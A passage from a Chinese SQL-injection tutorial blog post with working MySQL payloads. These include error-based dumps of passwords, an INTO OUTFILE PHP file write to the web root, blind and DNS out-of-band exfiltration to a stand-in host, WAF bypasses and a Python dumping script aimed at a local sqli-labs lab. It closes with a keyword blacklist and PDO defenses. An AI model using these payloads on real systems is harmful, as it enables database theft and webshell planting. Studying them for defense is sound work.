双注入的原理，简单一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句（group by）就会把查询的一部分以错误的形式显示出来“通过floor报错的方法来爆数据的本质是group by语句的报错。 Group by 在分组的时候先会对前面的concat(floor(rand()*2))进行检测，无疑只有0和1 两种结果 进行分类，然后就会插入这条数据 插入的过程中又会再进行一次计算 如果检测所计算出来的数和插入时所计算出来的数不一样，这个时候就会报错。&lt;br /&gt; 3.实际操作(和有正确回显的操作类似)①爆库： ?id=-1&apos; and (select 1 from (select count(*),concat(0x3a,(select schema_name from information_schema.schemata limit 0,1 ),floor(rand()*2 ),0x3a,0x3a )name from information_schema.tables group by name) b) --+ ②爆表名③爆列名④爆数据： ?id=-1&apos; and (select 1 from (select count(*),concat(0x3a,(select password from users limit 0,1 ),floor(rand()*2 ),0x3a,0x3a )name from information_schema.tables group by name) b) --+ 其他更多函数的报错注入extractvalue()、updatexml()、GeometryCollection()、polygon()、multipoint()、multilinestring()、multipolygon()、linestring()、exp()以后再深入练习吧.. 0x04基于文件读写权限的注入1.前提：需要my.ini(phpstudy中)里面的 secur_file_priv变量为空，不敢一般MySQL5.5.53之前的版本默认为空，之后的版本为null，所以说这种注入比较依赖MySQL的版本。可以使用：select @@secure_file_priv来查询权限。关于secur_file_priv变量更多： 如果变量设置为目录的名称，则服务器会将导入和导出操作限制在跟这个目录中一起使用。这个目录必须存在，服务器不会自己创建它。如果变量为空，则不会产生影响，引起不安全的配置。如果变量设置为NULL，那么服务器就会禁用导入和导出操作。这个值从MySQL 5.5.53版本开始允许。 2.需要知道的函数：①Load_file：读文件②INTO DUMPFILE/OUTFILE：将表的内容导出为一个文本文件 Tips：INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择 实际演示：select * from users into outfile ‘d:/1.txt’;select load_file(‘d:/1.txt’)3.实际操作(两种思路)①上菜刀 ?id=1&apos;)) union select 1,2,0x3c3f70687020706870696e666f28293b3f3e into outfile &apos;D:/phpStudy/www/1234.php&apos; --+ Tips：?在URL里面表示传参，如果一句话木马里面有 ?php 所以用get传参的 会将php当作变量。 ②改扩展名绕过操作： ?id=1&apos;)) union select 1,2,load_file(&apos;D:/phpStudy/www/1234.php&apos;) into outfile &apos;D:/phpStudy/www/123455.txt&apos; --+ 0x05盲注1.相关函数：①length():返回字符串的长度②substr():截取字符串 substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将字符转换为ascii码格式。③ascii():返回字符的ascii码④if():If(exor1,expr2,expr3)在mysql中是第一个参数成立的时候执行第二个参数，否则执行第三个参数2.实际操作：①判断注入点： Id=-1&apos; or sleep(5) --+ ②爆库： If(Ascii(substr(select schema_name from information_schema.schemata limit 0,1),1,1))=100,sleep(),null)as name ③爆表④爆字段⑤爆数据都是一样的套路 Tips：substr()的小技巧：例如在substr(database(),1,1)中逗号被过滤了，我们可以使用from 1 to 1来绕过过滤。那么有同样格式的limit 0,1有没有这样的绕过呢？当然有。格式为：1 offset 0这里注查询数字的顺序。 0x06多种位置的注入：其实都是一样的方法，只是位置不一样。一般来说，有以下几种注入位置：1.Get、Post2.UA头3.referer头4.cookie 0x07带外通道：什么是带外通道注入？ 使用背景：在进行sql注入攻击的时候我们经常会遇见无回显的情况，那我们就不能进行注入了么？其实攻击可能已经成功了，But应用程序未返回任何结果，使你误以为攻击失败。一种获取数据的有效方法是使用带外通道能够在数据库中执行任意SQL语句后,我们可以利用数据的一些内置功能在数据库与自己的计算机直接建立网络连接,通过它传送从数据库中收集的任何信息一般可以提取数据的途径:通过HTTP(S)请求、DNS剖析、文件系统、电子邮件等等 对于MySQL而言同样和文件读写一样，需要secure_file_priv这个全局变量控制的权限，具体见0x03中对该变量的介绍。利用条件： 全局变量secure_file_priv = ‘ ‘ 可以用SQL server连接到mysql数据库 使用DNS解析提取数据在mysql中会对查询语句中的ip和网址尝试DNS解析。例如： select load_file(concat(‘\\\\’,version()’yoursite.com\\a.txt’)); 然后我们可以通过抓包看MySql发出的DNS查询数据或者使用网上现成的https://dnsbin.zhack.ca/ 就可以看到mysql发送过来的数据 0x08各种绕过姿势：绕过单引号 大小写绕过 ?id=1+UnIoN+SeLecT+1,2,3-- 替换绕过 ?id=1+UNunionION+SEselectLECT+1,2,3-- 注释绕过 ?id=1+un/**/ion+se/**/lect+1,2,3-- 特殊嵌入绕过 ?id=1/*!UnIoN*/SeLecT+1,2,3-- //在别的数据库中是注释但是在mysql中可以成功执行在语句前可以加上5位数字，代表版本号，表示只有在大于该版本的mysql中不作为注释 宽字节注入SQL注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。在我们代码审计的过程中产生这个注入的原因有两个1.character_set_client=gbk(SET NAMES的误用)2.mysql_real_escape_string()的错误使用 二次urldecode注入绕过在我们代码审计的时候如果某处用了urldecode或者rawurldecode函数，则会二次解码(webserver和该函数)而绕过gpc或者是addslashes等过滤函数。 特殊字符绕过空格 Example: &apos;%0AUNION%0CSELECT%A0NULL%20%23 注释符&amp;引号 ①SELECT DISTINCT(db) FROM mysql.db WHERE `Host`=&apos;localhost&apos; and/**/1=1; ②SELECT DISTINCT(db) FROM mysql.db WHERE `Host`=&apos;localhost&apos; and&quot;1=1&quot;; 编码绕过URL编码、HEX编码、Base64编码 0x09利用工具1.sqlmap2.Pangolin（穿山甲）3.Domain等等 0x10如何用python写工具？在我简单学习了requests库、和re库之后，编写了一个简单的脚本(第一次写bug有点多、局限也很多..) #coding=UTF-8 import re import requests from bs4 import BeautifulSoup import sys reload(sys) sys.setdefaultencoding(&apos;utf8&apos;) def getHTMLText(url): try: r = requests.get(url) r.raise_for_status() r.encoding = r.apparent_encoding return r.text except: print(&quot;getHTMLText error&quot;) return &quot;getHTMLText right&quot; #捕捉返回的错误，判断注入点 def sqlloc_error(html,url,lists): try: error = re.search(r&apos;syntax&apos;,html) if error: lists.append(url) except: return &quot;rightback error&quot; #构造注入点的url def testsql(start_url,lists): injects = [&apos;\&apos;&apos; , &apos;\&quot;&apos; ,&apos;)&apos;, &apos;\&apos;)&apos;, &apos;\&quot;)&apos;] for inject in injects: url = start_url + inject html = getHTMLText(url) sqlloc_error(html,url,lists) #捕捉爆库返回的字段 def sqlrep_back(html,payload_reps): try: soup = BeautifulSoup(html,&quot;html.parser&quot;) Rep = soup.select(&quot;font &gt; font&quot;) NRep = Rep[0].text NNRep = NRep.split(&apos;:&apos;)[2] num = len(NNRep.split(&apos;,&apos;)) for i in range(num): payload_reps.append(NNRep.split(&apos;,&apos;)[i]) print(payload_reps[i]) except: return &quot;sqlrep_back error&quot; #爆库(这里还没有实现自动判断字段数，下面的payload也可以写成批量) def BoomRepository(list,payload_reps): newurl = list + &quot; union select 1,2,group_concat(schema_name) from information_schema.schemata --+&quot; html = getHTMLText(newurl) sqlrep_back(html,payload_reps) #捕捉爆出的表 def sqltab_back(html,payload_tables): try: soup = BeautifulSoup(html,&apos;html.parser&apos;) Tab = soup.select(&quot;font &gt; font&quot;) NTab = Tab[0].text NNTab = NTab.split(&apos;:&apos;)[2] num = len(NNTab.split(&apos;,&apos;)) for i in range(num): payload_tables.append(NNTab.split(&apos;,&apos;)[i]) print(payload_tables[i]) except: print(&quot;sqltab_back error&quot;) #爆表 def BoomTable(list,payload_columns,payload_tables,payload_reps): for payload_rep in payload_reps: newurl = list + &quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;&quot; + payload_rep + &quot;&apos; --+&quot; print(&quot;-----------正在爆&quot; + payload_rep + &quot;库的表-----------&quot;) html = getHTMLText(newurl) sqltab_back(html,payload_tables) for payload_table in payload_tables: print(&quot;-------------------------正在爆&quot; + payload_rep +&quot;库的&quot; + payload_table + &quot;表的字段-------------------------&quot;) Boomcolumn(list, payload_tables,payload_columns) #捕捉爆出的字段 def sqlcol_back(html,payload_columns): try: soup = BeautifulSoup(html,&apos;html.parser&apos;) Col = soup.select(&quot;font &gt; font&quot;) NCol = Col[0].text NNCol = NCol.split(&apos;:&apos;)[2] num = len(NNCol.split(&apos;,&apos;)) for i in range(num): payload_columns.append(NNCol.split(&apos;,&apos;)[i]) print(payload_columns[i]) except: print(&quot;sqlcol_back error&quot;) #爆字段 def Boomcolumn(list, payload_tables,payload_columns): for payload_table in payload_tables: newurl = list + &quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;&quot; + payload_table + &quot;&apos; --+&quot; html = getHTMLText(newurl) sqlcol_back(html, payload_columns) def main(): lists = [] #判断是否有注入点的url payload_reps = [] #爆出来的库的列表 payload_tables = [] #爆出来的表的列表、 payload_columns = [] #爆出来的字段 start_url = &apos;https://127.0.0.1/sqli-labs-master/Less-1/?id=-1&apos; testsql(start_url,lists) print(&quot;-----------------------正在爆库--------------------------&quot;) BoomRepository(lists[0], payload_reps) print(&quot;------------------------正在爆表--------------------------&quot;) BoomTable(lists[0], payload_columns, payload_tables, payload_reps) main() 0x11如何防御？ 引发SQL注入漏洞的原因：动态SQL或者将SQL查询组装成包含受用户控制的输入的字符串并提交给数据库 使用黑名单验证我们进行SQL注入的时候肯定离不开这些关键词： and、or、order insert、into delete replace、update union、select load_file、outfile 和一些特殊符号 具体的实现代码： private function filter_keyword( $string ) { $keyword=&apos;select|insert|update|delete|\&apos;|\/\*|\*|\.\.\/|\.\/|union|and|union|order|or|into|load_file|outfile&apos;; $arr = explode( &apos;|&apos;, $keyword ); $result = str_ireplace( $arr, &apos;&apos;, $string ); return $result; } 当然这里这是一个基本的思路，实际环境中还需要更强大的正则来进行黑名单过滤。 正确使用过滤方式1.gpc/runtime魔术引号：bug来源无非两种方式，一种是从类似于get、post等中被动式的获得参数;还有一种是主动的获得参数，比如读取远程页面或者文件。所以gpc/runtime在这就很重要了。2.addslashes函数(字符型防御)、mysql_[real_]escape_string函数、intval函数等等 使用预处理语句：PDO 什么是PDO？PDO是PHP Data Objects（php数据对象）的缩写。是在php5.1版本之后开始支持pdo。你可以把pdo看做是php提供的一个类。它提供了一组数据库抽象层API，使得编写php代码不再关心具体要连接的数据库类型。你既可以用使用pdo连接mysql，也可以用它连接oracle。并且pdo很好的解决了sql注入问题。 为什么要使用PDO查询?使用传统的 mysql_connect 、mysql_query方法来连接查询数据库时，如果过滤不严紧，就有SQL注入风险。虽然可以用mysql_real_escape_string()函数过滤用户提交的值，但是也有缺陷。而使用PHP的PDO扩展的 prepare 方法，就可以避免sql injection 风险。 具体实现方法$dbh = new PDO(&quot;mysql:host=localhost; dbname=demo&quot;, &quot;user&quot;, &quot;pass&quot;); $dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); //禁用prepared statements的仿真效果，确保传递到mysql服务器之前没有被PHP解析(禁止了所有可能的sql注入) $dbh-&gt;exec(&quot;set names &apos;utf8&apos;&quot;); $sql=&quot;select * from test where name = ? and password = ?&quot;; $stmt = $dbh-&gt;prepare($sql); $exeres = $stmt-&gt;execute(array($testname, $pass)); if ($exeres) { while ($row = $stmt-&gt;fetch(PDO::FETCH_ASSOC)) { print_r($row); } } $dbh = null; 其实到这里我也不是很懂原理，然后搜索了一下资料了解了一下PHP与 mysql sever通讯细节： 为何PDO能防SQL注入？请先看以下PHP代码： &lt;?php $pdo = new PDO(&quot;mysql:host=192.168.0.1;dbname=test;charset=utf8&quot;,&quot;root&quot;); $conn-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION); // set the PDO error mode to exception $st = $pdo-&gt;prepare(&quot;select * from info where id =? and name = ?&quot;); $id = 21; $name = &apos;zhangsan&apos;; $st-&gt;bindParam(1,$id); $st-&gt;bindParam(2,$name); $st-&gt;execute(); $st-&gt;fetchAll(); ?&gt; 环境如下：PHP 5.4.7Mysql 协议版本 10MySQL Server 5.5.27为了彻底搞清楚php与mysql server通讯的细节，我特别使用了wireshark抓包进行研究之,安装wireshak之后，我们设置过滤条件为tcp.port==3306, 如下图：如此只显示与mysql 3306端口的通信数据，避免不必要的干扰。特别要注意的是wireshak基于wincap驱动，不支持本地环回接口的侦听（即使用php连接本地mysql的方法是无法侦听的），请连接其它机器（桥接网络的虚拟机也可）的MySQL进行测试。然后运行我们的PHP程序，侦听结果如下，我们发现，PHP只是简单地将SQL直接发送给MySQL Server :其实，这与我们平时使用mysql_real_escape_string将字符串进行转义，再拼接成SQL语句没有差别（只是由PDO本地驱动完成转义的），显然这种情况下还是有可能造成SQL注入的，也就是说在php本地调用pdo prepare中的mysql_real_escape_string来操作query，使用的是本地单字节字符集，而我们传递多字节编码的变量时，有可能还是会造成SQL注入漏洞(php 5.3.6以前版本的问题之一，这也就解释了为何在使用PDO时，建议升级到php 5.3.6+，并在DSN字符串中指定charset的原因。针对php 5.3.6以前版本，以下代码仍然可能造成SQL注入问题： $pdo-&gt;query(&apos;SET NAMES GBK&apos;); $var = chr(0xbf) . chr(0x27) . &quot; OR 1=1 /*&quot;; $query = &quot;SELECT * FROM info WHERE name = ?&quot;; $stmt = $pdo-&gt;prepare($query); $stmt-&gt;execute(array($var)); 原因与上面的分析是一致的。而正确的转义应该是给mysql Server指定字符集，并将变量发送给MySQL Server完成根据字符转义。那么，如何才能禁止PHP本地转义而交由MySQL Server转义呢？PDO有一项参数，名为PDO::ATTR_EMULATE_PREPARES ，表示是否使用PHP本地模拟prepare，此项参数默认值未知。而且根据我们刚刚抓包分析结果来看，php 5.3.6+默认还是使用本地变量转，拼接成SQL发送给MySQL Server的，我们将这项值设置为false, 试试效果，如以下代码： &lt;?php $pdo = new PDO(&quot;mysql:host=192.168.0.1;dbname=test;&quot;,&quot;root&quot;); $pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); $st = $pdo-&gt;prepare(&quot;select * from info where id =? and name = ?&quot;); $id = 21; $name = &apos;zhangsan&apos;; $st-&gt;bindParam(1,$id); $st-&gt;bindParam(2,$name); $st-&gt;execute(); $st-&gt;fetchAll(); ?&gt; 红色行是我们刚加入的内容，运行以下程序，使用wireshark抓包分析，得出的结果如下：看到了吗？这就是神奇之处，可见这次PHP是将SQL模板和变量是分两次发送给MySQL的，由MySQL完成变量的转义处理，既然变量和SQL模板是分两次发送的，那么就不存在SQL注入的问题了，但需要在DSN中指定charset属性，如： $pdo = new PDO(&apos;mysql:host=localhost;dbname=test;charset=utf8&apos;, &apos;root&apos;); 参考文献：https://zhangxugg-163-com.iteye.com/blog/1835721]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
</search>
